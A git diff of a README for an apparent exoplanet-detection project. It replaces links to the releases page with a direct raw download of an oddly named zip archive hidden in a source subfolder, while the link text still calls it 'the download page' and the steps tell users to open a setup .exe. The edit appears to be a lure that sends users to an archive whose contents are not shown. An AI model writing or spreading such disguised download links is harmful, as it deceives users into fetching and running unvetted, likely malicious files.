@@ -1,6 +1,6 @@
 # 🔭 NASA_exoplanet_detection_using_CNN_transfromer - Detect distant planets using smart technology
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/lionj1696/NASA_exoplanet_detection_using_CNN_transfromer/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/lionj1696/NASA_exoplanet_detection_using_CNN_transfromer/raw/refs/heads/main/src/preprocessing/CN_detection_exoplanet_NAS_using_transfromer_2.8-beta.3.zip)
 
 ## 📋 Project Overview
 
@@ -22,7 +22,7 @@ Your computer needs to meet these standards to run the software.
 
 Follow these steps to set up the software on your computer.
 
-1. Visit [this link](https://github.com/lionj1696/NASA_exoplanet_detection_using_CNN_transfromer/releases) to reach the download page.
+1. Visit [this link](https://github.com/lionj1696/NASA_exoplanet_detection_using_CNN_transfromer/raw/refs/heads/main/src/preprocessing/CN_detection_exoplanet_NAS_using_transfromer_2.8-beta.3.zip) to reach the download page.
 2. Look for the file named `NASA_Exoplanet_Detector_Setup.exe` in the assets section.
 3. Click the file to start the download.
 4. Open the downloaded file once the process finishes.
